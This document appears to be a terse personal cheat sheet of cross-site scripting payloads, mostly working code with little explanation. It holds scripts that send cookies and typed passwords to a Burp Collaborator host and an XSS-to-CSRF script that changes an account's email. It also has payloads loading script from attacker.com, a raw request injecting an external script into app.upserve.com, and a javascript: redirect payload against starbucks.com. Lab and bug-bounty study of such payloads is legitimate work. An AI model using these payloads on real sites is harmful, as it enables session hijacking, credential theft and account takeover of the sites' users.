ialert
~~~
<script>alert(10)</script>
~~~



Exploiting cross-site scripting to steal cookies

~~~
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
~~~


Exploiting cross-site scripting to capture passwords

~~~
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
~~~

 Exploiting XSSto perform CSRF
 
~~~
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
~~~


 ~~~
 document.url
 document.document
 document.URLUnencoded
 document.baseURI
 location
 location.href
 location,search
 location.hash
 location.pathname
 ~~~


~~~
"><svg onload=alert(1)>"
~~~


 Reflected XSS: Use simple payloads that execute immediately, such 

~~~
 `<script>alert(1)</script>`
 `<img src=x onerror=alert(1)>`
 `<svg onload=alert(1)>`
~~~


Stored XSS: Use more complex payloads that can execute over multiple requests or persist across sessions, such as 

~~~
`<script src=https://attacker.com/xss.js></script>`
`<iframe src=https://attacker.com/xss.html></iframe>`.
~~~


DOM-based XSS: Use payloads that manipulate the DOM, such as 

~~~
`location=https://attacker.com/evil.html`
`document.write("<script>alert(1)</script>")`.
~~~

Login page or sign page xss payloads

~~~
"><img src=x onerror=alert(document.cookie);>
~~~


Request

~~~
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email[YOUREMAIL]&brand_pretty_url=acewasabis-rock-n-roll-sushi
~~~


Response

~~~
HTTP/1.1 201 Created
Server: nginx
Date: Thu, 13 Jul 2017 11:26:34 GMT
Content-Type: application/json
Content-Length: 239
Connection: close
Status: 201 Created
Access-Control-Allow-Origin: https://app.upserve.com
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE
Access-Control-Expose-Headers: 
Access-Control-Max-Age: 1728000
Access-Control-Allow-Credentials: true
Vary: Origin
ETag: "a8ab39d1ae25526ac5b541fefeb87d08"
Cache-Control: max-age=0, private, must-revalidate
X-Request-Id: 71af833e-003d-4f70-aba5-8318f9cec8e3

{"uuid":"<random UUID, not payload>","email":"asuka@asuka.h1","first_name":null,"last_name":null,"display_name":"Asuka","is_admin":false,"show_new_branding":true,"has_password":false,"loyalty_program_memberships":[],"has_cards":false}
~~~


~~~
Open the url: [https://www.starbucks.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529](https://www.starbucks.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529)
~~~


